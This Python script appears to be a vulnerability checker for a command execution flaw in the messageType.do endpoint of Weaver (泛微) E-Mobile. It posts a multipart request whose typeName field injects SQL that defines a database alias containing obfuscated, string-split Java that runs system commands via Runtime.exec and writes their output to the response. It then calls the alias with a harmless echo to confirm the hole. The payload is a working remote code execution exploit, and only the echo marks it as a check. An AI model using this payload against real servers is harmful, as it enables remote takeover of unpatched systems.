import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Mobile-messageType.do存在命令执行漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'multipart/form-data; boundary=00content0boundary00',
        'User-Agent': 'Java/1.8.0_371',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection': 'close',
        'Content-Length': '1088'
    }
    data = '''--00content0boundary00
    Content-Disposition: form-data; name="method"

    create
    --00content0boundary00
    Content-Disposition: form-data; name="typeName"

    1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagm('echo mht666');--
    --00content0boundary00--'''
    vurl = urllib.parse.urljoin(url, "/messageType.do")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'mht666' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult